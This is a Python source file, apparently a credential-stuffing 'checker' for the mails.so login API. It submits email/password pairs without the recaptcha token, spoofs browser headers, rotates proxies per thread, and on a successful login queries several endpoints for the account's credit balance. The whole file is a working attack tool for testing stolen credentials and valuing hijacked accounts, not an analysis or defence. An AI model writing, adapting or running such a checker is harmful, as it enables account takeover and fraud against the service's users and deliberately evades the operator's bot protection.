"""
Checker for mails.so – without recaptcha token.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://api.mails.so"
LOGIN_URL = BASE_URL + "/auth/login"
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mails.so",
        "Referer": "https://mails.so/login",
    })

    # Payload without recaptchaToken
    payload = {
        "email": email,
        "password": password,
    }

    try:
        resp = session.post(LOGIN_URL, json=payload, timeout=TIMEOUT)
        try:
            data = resp.json()
        except ValueError:
            return False, f"Invalid JSON response: {resp.text[:100]}"

        # Debug: print the full response (remove in production)
        # print(f"Response: {data}")

        # Check for success indicators
        if data.get("status") == "success" or data.get("message") == "Logged in":
            # Login successful – try to fetch credits
            credits = None
            credit_endpoints = [
                "/user/credits",
                "/credits",
                "/account/credits",
                "/user",
            ]
            for endpoint in credit_endpoints:
                try:
                    cred_resp = session.get(BASE_URL + endpoint, timeout=TIMEOUT)
                    if cred_resp.status_code == 200:
                        cred_data = cred_resp.json()
                        if "credits" in cred_data:
                            credits = cred_data["credits"]
                            break
                        if "available" in cred_data:
                            credits = cred_data["available"]
                            break
                        if "user" in cred_data and "credits" in cred_data["user"]:
                            credits = cred_data["user"]["credits"]
                            break
                except:
                    continue

            if credits is not None:
                return True, f"Login successful. Credits: {credits}"
            else:
                return True, "Login successful (could not retrieve credits)"

        # Check for error message
        msg = data.get("message", "")
        if msg:
            if "invalid" in msg.lower() or "incorrect" in msg.lower():
                return False, f"Login failed: {msg}"
            # If message is something else (e.g., "Missing credentials"), return it
            return False, f"Login failed: {msg}"

        # If no message, check if we got a token or user data (some APIs return that)
        if "token" in data or "user" in data:
            return True, "Login successful (token received)"

        # Fallback: if we got any data and no error, assume success
        if data:
            return True, "Login successful (assumed from response)"
        else:
            return False, "Login failed – empty response"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"